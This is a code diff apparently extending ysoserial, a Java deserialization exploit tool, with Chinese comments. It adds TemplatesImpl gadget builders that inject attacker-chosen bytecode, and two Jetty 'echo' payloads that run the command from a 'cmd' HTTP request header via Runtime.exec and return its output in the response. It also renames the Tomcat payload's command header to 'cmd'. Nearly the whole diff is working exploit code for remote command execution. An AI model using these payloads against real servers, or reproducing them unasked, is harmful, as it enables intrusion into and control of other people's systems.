@@ -3,12 +3,17 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+import java.io.File;
+import java.io.FileInputStream;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -48,6 +53,8 @@ public class Gadgets {
         private static final long serialVersionUID = 8207363842866235160L;
     }
 
+    public static class StubTransletPayload  {
+    }
 
     public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
@@ -75,6 +82,31 @@ public class Gadgets {
         return map;
     }
 
+    /*
+    参考： https://mp.weixin.qq.com/s/WDmj4-2lB-hlf_Fm_wDiOg
+    重载createTemplatesImpl方法，接收参数为让服务端加载的Class对象, _bytecodes参数携带要加载的目标类字节码
+    */
+    public static <T>  T createTemplatesImpl (Class c ) throws Exception {
+        Class<T> tplClass = null;
+
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+            tplClass = (Class<T>)Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
+        } else{
+            tplClass = (Class<T>)TemplatesImpl.class;
+        }
+
+        final  T templates = tplClass.newInstance();
+        // 将class转换成字节
+        final  byte[] classBytes = ClassFiles.classAsBytes(c);
+
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
+            classBytes
+        });
+
+        Reflections.setFieldValue(templates, "_name", "pwnr" + System.nanoTime());
+
+        return templates;
+    }
 
     public static Object createTemplatesImpl ( final String command ) throws Exception {
         if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
@@ -87,6 +119,7 @@ public class Gadgets {
 
         return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
+
 
 
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
@@ -120,6 +153,62 @@ public class Gadgets {
         return templates;
     }
 
+
+    // 自定义代码，参考：https://xz.aliyun.com/t/7535
+    /*
+    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+        throws Exception {
+
+        final T templates = tplClass.newInstance();
+
+        final byte[] classBytes;
+        String cmd;
+        ClassPool pool = ClassPool.getDefault();
+        final CtClass clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
+
+        if(command.startsWith("code:")){
+            System.err.println("Java Code Mode:"+command.substring(5));
+            cmd = command.substring(5);
+            clazz.makeClassInitializer().insertAfter(cmd);
+            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+            clazz.setName("ysoserial.Pwner" + System.nanoTime());
+            CtClass superC = pool.get(abstTranslet.getName());
+            clazz.setSuperclass(superC);
+            classBytes = clazz.toBytecode();
+        } else if(command.startsWith("codefile,")) {
+            String path = command.split(",")[1];
+            System.out.println(path);
+
+            FileInputStream in =new FileInputStream(new File(path));
+            classBytes=new byte[in.available()];
+            in.read(classBytes);
+            in.close();
+//            System.err.println("Java File Mode:"+ Arrays.toString(classBytes));
+        } else {
+            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+                "\");";
+            clazz.makeClassInitializer().insertAfter(cmd);
+            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+            clazz.setName("ysoserial.Pwner" + System.nanoTime());
+            CtClass superC = pool.get(abstTranslet.getName());
+            clazz.setSuperclass(superC);
+            classBytes = clazz.toBytecode();
+        }
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+            classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
+     */
+
+
     public static Object createTemplatesTomcatEcho() throws Exception {
         if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
             return createTemplatesImplEcho(
@@ -130,6 +219,176 @@ public class Gadgets {
 
         return createTemplatesImplEcho(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
+
+    public static Object createTemplatesJettyEcho() throws Exception {
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
+            return createTemplatesImplEcho(
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        }
+
+//        return createTemplatesImplEcho(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+//        return createTemplatesImplJettyEcho(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        return createTemplatesImplJettyEcho2(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
+
+
+
+    // Jetty回显
+    private static <T> T createTemplatesImplJettyEcho(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception{
+
+        final T templates = tplClass.newInstance();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        CtClass clazz;
+        clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
+        if (clazz.getDeclaredConstructors().length != 0) {
+            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
+        }
+
+
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+
+        clazz.addConstructor(CtNewConstructor.make(
+            "    public JettyEcho() throws Exception{\n" +
+                "        Class clazz = Thread.currentThread().getClass();\n" +
+                "        java.lang.reflect.Field field = clazz.getDeclaredField(\"threadLocals\");\n" +
+                "        field.setAccessible(true);\n" +
+                "        Object obj = field.get(Thread.currentThread());\n" +
+                "        field = obj.getClass().getDeclaredField(\"table\");\n" +
+                "        field.setAccessible(true);\n" +
+                "        obj = field.get(obj);\n" +
+                "        Object[] obj_arr = (Object[]) obj;\n" +
+                "        for(int i = 0; i < obj_arr.length; i++){\n" +
+                "            Object o = obj_arr[i];\n" +
+                "            if(o == null) continue;\n" +
+                "            field = o.getClass().getDeclaredField(\"value\");\n" +
+                "            field.setAccessible(true);\n" +
+                "            obj = field.get(o);\n" +
+                "            if(obj != null && obj.getClass().getName().endsWith(\"AsyncHttpConnection\")){\n" +
+                "                Object connection = obj;\n" +
+                "                java.lang.reflect.Method method = connection.getClass().getMethod(\"getRequest\", null);\n" +
+                "                obj = method.invoke(connection, null);\n" +
+                "                method = obj.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
+                "                String cmd = (String)method.invoke(obj, new Object[]{\"cmd\"});\n" +
+                "                if(cmd != null && !cmd.isEmpty()){\n" +
+                "                    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
+                "                    method = connection.getClass().getMethod(\"getPrintWriter\", new Class[]{String.class});\n" +
+                "                    java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, new Object[]{\"utf-8\"});\n" +
+                "                    printWriter.println(res);\n" +
+                "                }\n" +
+                "                break;\n" +
+                "            }else if(obj != null && obj.getClass().getName().endsWith(\"HttpConnection\")){\n" +
+                "                java.lang.reflect.Method method = obj.getClass().getDeclaredMethod(\"getHttpChannel\", null);\n" +
+                "                Object httpChannel = method.invoke(obj, null);\n" +
+                "                method = httpChannel.getClass().getMethod(\"getRequest\", null);\n" +
+                "                obj = method.invoke(httpChannel, null);\n" +
+                "                method = obj.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
+                "                String cmd = (String)method.invoke(obj, new Object[]{\"cmd\"});\n" +
+                "                if(cmd != null && !cmd.isEmpty()){\n" +
+                "                    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
+                "                    method = httpChannel.getClass().getMethod(\"getResponse\", null);\n" +
+                "                    obj = method.invoke(httpChannel, null);\n" +
+                "                    method = obj.getClass().getMethod(\"getWriter\", null);\n" +
+                "                    java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);\n" +
+                "                    printWriter.println(res);\n" +
+                "                }\n" +
+                "\n" +
+                "                break;\n" +
+                "            }\n" +
+                "        }\n" +
+                "    }"
+        ,clazz));
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
+            classBytes,
+//            classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "Pwnr" + System.nanoTime());
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
+
+
+    // Jetty回显
+    private static <T> T createTemplatesImplJettyEcho2(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception{
+
+        final T templates = tplClass.newInstance();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        CtClass clazz;
+        clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
+        if (clazz.getDeclaredConstructors().length != 0) {
+            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
+        }
+
+
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+
+        clazz.addConstructor(CtNewConstructor.make("public JettyEcho() throws Exception{\n" +
+                "        Thread thread = Thread.currentThread();\n" +
+                "        java.lang.reflect.Field threadLocals = Thread.class.getDeclaredField(\"threadLocals\");\n" +
+                "        threadLocals.setAccessible(true);\n" +
+                "        Object threadLocalMap = threadLocals.get(thread);\n" +
+                "        Class threadLocalMapClazz = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap\");\n" +
+                "        java.lang.reflect.Field tableField = threadLocalMapClazz.getDeclaredField(\"table\");\n" +
+                "        tableField.setAccessible(true);\n" +
+                "        Object[] objects = (Object[]) tableField.get(threadLocalMap);\n" +
+                "        Class entryClass = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap$Entry\");\n" +
+                "        java.lang.reflect.Field entryValueField = entryClass.getDeclaredField(\"value\");\n" +
+                "        entryValueField.setAccessible(true);\n" +
+                "        for (int i = 0; i < objects.length; i++) {\n" +
+                "            Object obj = objects[i];\n" +
+                "            if(obj!=null){\n" +
+                "                Object httpConnection = entryValueField.get(obj);\n" +
+                "                if(httpConnection.getClass().getName().endsWith(\"HttpConnection\")){\n" +
+                "                    Object httpChannel = httpConnection.getClass().getMethod(\"getHttpChannel\").invoke(httpConnection);\n" +
+                "                    Object request = httpChannel.getClass().getMethod(\"getRequest\").invoke(httpChannel);\n" +
+                "                    String header = (String) request.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(request, new Object[]{\"cmd\"});\n" +
+                "                    Object response = httpChannel.getClass().getMethod(\"getResponse\").invoke(httpChannel);\n" +
+                "                    PrintWriter writer = (PrintWriter)response.getClass().getMethod(\"getWriter\").invoke(response);\n" +
+                "                    StringBuilder stringBuilder = new StringBuilder();\n" +
+                "                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(header).getInputStream()));\n" +
+                "                    String line;\n" +
+                "                    while((line = bufferedReader.readLine()) != null) {\n" +
+                "                        stringBuilder.append(line).append(\"\\n\");\n" +
+                "                    }\n" +
+                "                    String res = stringBuilder.toString();\n" +
+                "                    writer.write(res);\n" +
+                "                    writer.close();\n" +
+                "                }\n" +
+                "            }\n" +
+                "        }\n" +
+                "    };"
+            ,clazz));
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
+            classBytes,
+//            classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
+
+
 
     // Tomcat 全版本 payload，测试通过 tomcat6,7,8,9
     // 给请求添加 Testecho: 123，将在响应 header 看到 Testecho: 123，可以用与可靠漏洞的漏洞检测
@@ -216,7 +475,7 @@ public class Gadgets {
             "                    resp.getClass().getMethod(\"addHeader\", new Class[]{String.class, String.class}).invoke(resp, new Object[]{\"Testecho\", s});\n" +
             "                    done = true;\n" +
             "                }\n" +
-            "                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"Testcmd\"});\n" +
+            "                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"cmd\"});\n" +
             "                if (s != null && !s.isEmpty()) {\n" +
             "                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});\n" +
             "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", s} : new String[]{\"/bin/sh\", \"-c\", s};\n" +
